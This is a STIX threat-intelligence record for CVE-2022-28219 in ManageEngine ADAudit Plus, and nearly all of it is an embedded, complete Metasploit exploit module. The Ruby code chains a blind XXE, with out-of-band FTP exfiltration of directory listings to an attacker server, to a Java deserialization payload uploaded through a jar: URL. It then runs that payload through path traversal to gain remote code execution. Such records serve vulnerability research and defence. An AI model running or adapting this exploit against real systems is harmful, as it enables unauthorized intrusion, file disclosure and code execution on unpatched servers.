{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--216e8b4e-6e1b-4ff2-9125-fb0cab98ec6e",
    "created": "2024-08-14T16:53:41.703635Z",
    "modified": "2024-08-14T16:53:41.70364Z",
    "name": "ManageEngine ADAudit Plus CVE-2022-28219",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/manageengine_adaudit_plus_cve_2022_28219.rb",
            "external_id": "manageengine_adaudit_plus_cve_2022_28219.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-28219"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/red-team-blog-cve-2022-28219/"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/Zx3qJlmRGY/cve-2022-28219/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://www.manageengine.com/products/active-directory-audit/cve-2022-28219.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::JavaDeserialization\n  include Msf::Handler::Reverse::Comm\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine ADAudit Plus CVE-2022-28219',\n        'Description' => %q{\n          This module exploits CVE-2022-28219, which is a pair of\n          vulnerabilities in ManageEngine ADAudit Plus versions before build\n          7060: a path traversal in the /cewolf endpoint, and a blind XXE in,\n          to upload and execute an executable file.\n        },\n        'Author' => [\n          'Naveen Sunkavally', # Initial PoC + disclosure\n          'Ron Bowes', # Analysis and module\n        ],\n        'References' => [\n          ['CVE', '2022-28219'],\n          ['URL', 'https://www.horizon3.ai/red-team-blog-cve-2022-28219/'],\n          ['URL', 'https://attackerkb.com/topics/Zx3qJlmRGY/cve-2022-28219/rapid7-analysis'],\n          ['URL', 'https://www.manageengine.com/products/active-directory-audit/cve-2022-28219.html'],\n        ],\n        'DisclosureDate' => '2022-06-29',\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => [ARCH_CMD],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'win'\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8081\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI_DESERIALIZATION', [true, 'Path traversal and unsafe deserialization endpoint', '/cewolf/logo.png']),\n      OptString.new('TARGETURI_XXE', [true, 'XXE endpoint', '/api/agent/tabs/agentData']),\n      OptString.new('DOMAIN', [true, 'Active Directory domain that the target monitors', nil]),\n      OptInt.new('SRVPORT_FTP', [true, 'Port for FTP reverse connection', 2121]),\n      OptInt.new('SRVPORT_HTTP2', [true, 'Port for additional HTTP reverse connections', 8888]),\n    ])\n\n    register_advanced_options([\n      OptInt.new('PATH_TRAVERSAL_DEPTH', [true, 'The number of `../` to prepend to the path traversal attempt', 20]),\n      OptInt.new('FtpCallbackTimeout', [true, 'The amount of time, in seconds, the FTP server will wait for a reverse connection', 5]),\n      OptInt.new('HttpUploadTimeout', [true, 'The amount of time, in seconds, the HTTP file-upload server will wait for a reverse connection', 5]),\n    ])\n  end\n\n  def srv_host\n    if ((datastore['SRVHOST'] == '0.0.0.0') || (datastore['SRVHOST'] == '::'))\n      return datastore['URIHOST'] || Rex::Socket.source_address(rhost)\n    end\n\n    return datastore['SRVHOST']\n  end\n\n  def check\n    # Make sure it's ADAudit Plus by requesting the root and checking the title\n    res1 = send_request_cgi(\n      'method' => 'GET',\n      'uri' => '/'\n    )\n\n    unless res1\n      return CheckCode::Unknown('Target failed to respond to check.')\n    end\n\n    unless res1.code == 200 && res1.body.match?(/<title>ADAudit Plus/)\n      return CheckCode::Safe('Does not appear to be ADAudit Plus')\n    end\n\n    # Check if it's a vulnerable version (the patch removes the /cewolf endpoint\n    # entirely)\n    res2 = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(\"#{datastore['TARGETURI_DESERIALIZATION']}?img=abc\")\n    )\n\n    unless res2\n      return CheckCode::Unknown('Target failed to respond to check.')\n    end\n\n    unless res2.code == 200\n      return CheckCode::Safe('Target does not have vulnerable endpoint (likely patched).')\n    end\n\n    CheckCode::Vulnerable('The vulnerable endpoint responds with HTTP/200.')\n  end\n\n  def exploit\n    # List the /users folder - this is good to do first, since we can fail early\n    # if something isn't working\n    vprint_status('Attempting to exploit XXE to get a list of users')\n    users = get_directory_listing('/users')\n    unless users\n      fail_with(Failure::NotVulnerable, 'Failed to get a list of users (check your DOMAIN, or server may not be vulnerable)')\n    end\n\n    # Remove common users\n    users -= ['Default', 'Default User', 'All Users', 'desktop.ini', 'Public']\n    if users.empty?\n      fail_with(Failure::NotFound, 'Failed to find any non-default user accounts')\n    end\n    print_status(\"User accounts discovered: #{users.join(', ')}\")\n\n    # I can't figure out how to properly encode spaces, but using the 8.3\n    # version works! This converts them\n    users.map do |u|\n      if u.include?(' ')\n        u = u.gsub(/ /, '')[0..6].upcase + '~1'\n      end\n      u\n    end\n\n    # Check the filesystem for existing payloads that we should ignore\n    vprint_status('Enumerating old payloads cached on the server (to skip later)')\n    existing_payloads = search_for_payloads(users)\n\n    # Create a serialized payload\n    begin\n      # Create a queue so we can detect when the payload is delivered\n      queue = Queue.new\n\n      # Upload payload to remote server\n      # (this spawns a thread we need to clean up)\n      print_status('Attempting to exploit XXE to store our serialized payload on the server')\n      t = upload_payload(generate_java_deserialization_for_payload('CommonsBeanutils1', payload), queue)\n\n      # Wait for something to arrive in the queue (basically using it as a\n      # semaphor\n      vprint_status('Waiting for the payload to be sent to the target')\n      queue.pop # We don't need the result\n\n      # Get a list of possible payloads (never returns nil)\n      vprint_status(\"Trying to find our payload in all users' temp folders\")\n      possible_payloads = search_for_payloads(users)\n      possible_payloads -= existing_payloads\n\n      # Make sure the payload exists\n      if possible_payloads.empty?\n        fail_with(Failure::Unknown, 'Exploit appeared to work, but could not find the payload on the target')\n      end\n\n      # If multiple payloads appeared, abort for safety\n      if possible_payloads.length > 1\n        fail_with(Failure::UnexpectedReply, \"Found #{possible_payloads.length} apparent payloads in temp folders - aborting!\")\n      end\n\n      # Execute the one payload\n      payload_path = possible_payloads.pop\n      print_status(\"Triggering payload: #{payload_path}...\")\n\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri' => \"#{datastore['TARGETURI_DESERIALIZATION']}?img=#{'/..' * datastore['PATH_TRAVERSAL_DEPTH']}#{payload_path}\"\n      )\n\n      if res&.code != 200\n        fail_with(Failure::Unknown, \"Path traversal request failed with HTTP/#{res&.code}\")\n      end\n    ensure\n      # Kill the upload thread\n      if t\n        begin\n          t.kill\n        rescue StandardError\n          # Do nothing if we fail to kill the thread\n        end\n      end\n    end\n  end\n\n  def get_directory_listing(folder)\n    print_status(\"Getting directory listing for #{folder} via XXE and FTP\")\n\n    # Generate a unique callback URL\n    path = \"/#{rand_text_alpha(rand(8..15))}.dtd\"\n    full_url = \"http://#{srv_host}:#{datastore['SRVPORT']}#{path}\"\n\n    # Send the username anonymous and no password so the server doesn't log in\n    # with the password \"Java1.8.0_51@\" which is detectable\n    # We use `end_tag` at the end so we can detect when the listing is over\n    end_tag = rand_text_alpha(rand(8..15))\n    ftp_url = \"ftp://anonymous:password@#{srv_host}:#{datastore['SRVPORT_FTP']}/%file;#{end_tag}\"\n    serve_http_file(path, \"<!ENTITY % all \\\"<!ENTITY send SYSTEM '#{ftp_url}'>\\\"> %all;\")\n\n    # Start a server to handle the reverse FTP connection\n    ftp_server = Rex::Socket::TcpServer.create(\n      'LocalPort' => datastore['SRVPORT_FTP'],\n      'LocalHost' => datastore['SRVHOST'],\n      'Comm' => select_comm,\n      'Context' => {\n        'Msf' => framework,\n        'MsfExploit' => self\n      }\n    )\n\n    # Trigger the XXE to get file listings\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI_XXE']).to_s,\n      'ctype' => 'application/json',\n      'data' => create_json_request(\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \\\"file:#{folder}\\\"><!ENTITY % start \\\"<![CDATA[\\\"><!ENTITY % end \\\"]]>\\\"><!ENTITY % dtd SYSTEM \\\"#{full_url}\\\"> %dtd;]><data>&send;</data>\")\n    )\n\n    if res&.code != 200\n      fail_with(Failure::Unknown, \"XXE request to get directory listing failed with HTTP/#{res&.code}\")\n    end\n\n    ftp_client = nil\n    begin\n      # Wait for a connection with a timeout\n      select_result = ::IO.select([ftp_server], nil, nil, datastore['FtpCallbackTimeout'])\n\n      unless select_result && !select_result.empty?\n        print_warning(\"FTP reverse connection for directory enumeration failed - #{ftp_url}\")\n        return nil\n      end\n\n      # Accept the connection\n      ftp_client = ftp_server.accept\n\n      # Print a standard banner\n      ftp_client.print(\"220 Microsoft FTP Service\\r\\n\")\n\n      # We need to flip this so we can get a directory listing over multiple packets\n      directory_listing = nil\n\n      loop do\n        select_result = ::IO.select([ftp_client], nil, nil, datastore['FtpCallbackTimeout'])\n\n        # Check if we ran out of data\n        if !select_result || select_result.empty?\n          # If we got nothing, we're sad\n          if directory_listing.nil? || directory_listing.empty?\n            print_warning('Did not receive data from our reverse FTP connection')\n            return nil\n          end\n\n          # If we have data, we're happy and can break\n          break\n        end\n\n        # Receive the data that's waiting\n        data = ftp_client.recv(256)\n        if data.empty?\n          # If we got nothing, we're done receiving\n          break\n        end\n\n        # Match behavior with ftp://test.rebex.net\n        if data =~ /^USER ([a-zA-Z0-9_.-]*)/\n          ftp_client.print(\"331 Password required for #{Regexp.last_match(1)}.\\r\\n\")\n        elsif data =~ /^PASS /\n          ftp_client.print(\"230 User logged in.\\r\\n\")\n        elsif data =~ /^TYPE ([a-zA-Z0-9_.-]*)/\n          ftp_client.print(\"200 Type set to #{Regexp.last_match(1)}.\\r\\n\")\n        elsif data =~ /^EPSV ALL/\n          ftp_client.print(\"200 ESPV command successful.\\r\\n\")\n        elsif data =~ /^EPSV/ # (no space)\n          ftp_client.print(\"229 Entering Extended Passive Mode(|||#{rand(1025..1100)})\\r\\n\")\n        elsif data =~ /^RETR (.*)/m\n          # Store the start of the listing\n          directory_listing = Regexp.last_match(1)\n        else\n          # Have we started receiving data?\n          # (Disable Rubocop, because I think it's way more confusing to\n          # continue the elsif train)\n          if directory_listing.nil? # rubocop:disable Style/IfInsideElse\n            # We shouldn't really get here, but if we do, just play dumb and\n            # keep the client talking\n            ftp_client.print(\"230 User logged in.\\r\\n\")\n          else\n            # If we're receiving data, just append\n            directory_listing.concat(data)\n          end\n        end\n\n        # Break when we get the PORT command (this is faster than timing out,\n        # but doesn't always seem to work)\n        if !directory_listing.nil? && directory_listing =~ /(.*)#{end_tag}/m\n          directory_listing = Regexp.last_match(1)\n          break\n        end\n      end\n    ensure\n      ftp_server.close\n      if ftp_client\n        ftp_client.close\n      end\n    end\n\n    # Handle FTP errors (which thankfully aren't as common as they used to be)\n    unless ftp_client\n      print_warning(\"Didn't receive expected FTP connection\")\n      return nil\n    end\n\n    if directory_listing.nil? || directory_listing.empty?\n      vprint_warning('FTP client connected, but we did not receive any data over the socket')\n      return nil\n    end\n\n    # Remove PORT commands, split at \\r\\n or \\n, and remove empty elements\n    directory_listing.gsub(/PORT [0-9,]+[\\r\\n]/m, '').split(/\\r?\\n/).reject(&:empty?)\n  end\n\n  def search_for_payloads(users)\n    return users.flat_map do |u|\n      dir = \"/users/#{u}/appdata/local/temp\"\n      # This will search for the payload, but right now just print stuff\n      listing = get_directory_listing(dir)\n      unless listing\n        vprint_warning(\"Couldn't get directory listing for #{dir}\")\n        next []\n      end\n\n      listing\n           .select { |f| f =~ /^jar_cache[0-9]+.tmp$/ }\n           .map { |f| File.join(dir, f) }\n    end\n  end\n\n  def upload_payload(payload, queue)\n    t = framework.threads.spawn('adaudit-payload-deliverer', false) do\n      c = nil\n      begin\n        # We use a TCP socket here so we can hold the socket open after the HTTP\n        # conversation has concluded. That way, the server caches the file in\n        # the user's temp folder while it waits for more data\n        http_server = Rex::Socket::TcpServer.create(\n          'LocalPort' => datastore['SRVPORT_HTTP2'],\n          'LocalHost' => srv_host,\n          'Comm' => select_comm,\n          'Context' => {\n            'Msf' => framework,\n            'MsfExploit' => self\n          }\n        )\n\n        # Wait for the reverse connection, with a timeout\n        select_result = ::IO.select([http_server], nil, nil, datastore['HttpUploadTimeout'])\n        unless select_result && !select_result.empty?\n          fail_with(Failure::Unknown, \"XXE request to upload file did not receive a reverse connection on #{datastore['SRVPORT_HTTP2']}\")\n        end\n\n        # Receive and discard the HTTP request\n        c = http_server.accept\n        c.recv(1024)\n        c.print \"HTTP/1.1 200 OK\\r\\n\"\n        c.print \"Connection: keep-alive\\r\\n\"\n        c.print \"\\r\\n\"\n        c.print payload\n\n        # This will notify the other thread that something has arrived\n        queue.push(true)\n\n        # This has to stay open as long as it takes to enumerate all users'\n        # directories to find then execute the payload. ~5 seconds works on\n        # a single-user system, but I increased this a lot for production.\n        # (This thread should be killed when the exploit completes in any case)\n        Rex.sleep(60)\n      ensure\n        http_server.close\n        if c\n          c.close\n        end\n      end\n    end\n\n    # Trigger the XXE to get file listings\n    path = \"/#{rand_text_alpha(rand(8..15))}.jar!/file.txt\"\n    full_url = \"http://#{srv_host}:#{datastore['SRVPORT_HTTP2']}#{path}\"\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI_XXE']).to_s,\n      'ctype' => 'application/json',\n      'data' => create_json_request(\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE data [<!ENTITY % xxe SYSTEM \\\"jar:#{full_url}\\\"> %xxe;]>\")\n    )\n\n    if res&.code != 200\n      fail_with(Failure::Unknown, \"XXE request to upload payload failed with HTTP/#{res&.code}\")\n    end\n\n    return t\n  end\n\n  def serve_http_file(path, respond_with = '')\n    # do not use SSL for the attacking web server\n    if datastore['SSL']\n      ssl_restore = true\n      datastore['SSL'] = false\n    end\n\n    start_service({\n      'Uri' => {\n        'Proc' => proc do |cli, _req|\n          send_response(cli, respond_with)\n        end,\n        'Path' => path\n      }\n    })\n\n    datastore['SSL'] = true if ssl_restore\n  end\n\n  def create_json_request(xml_payload)\n    [\n      {\n        'DomainName' => datastore['domain'],\n        'EventCode' => 4688,\n        'EventType' => 0,\n        'TimeGenerated' => 0,\n        'Task Content' => xml_payload\n      }\n    ].to_json\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-06-29",
    "x_mitre_platforms": [
        "win"
    ]
}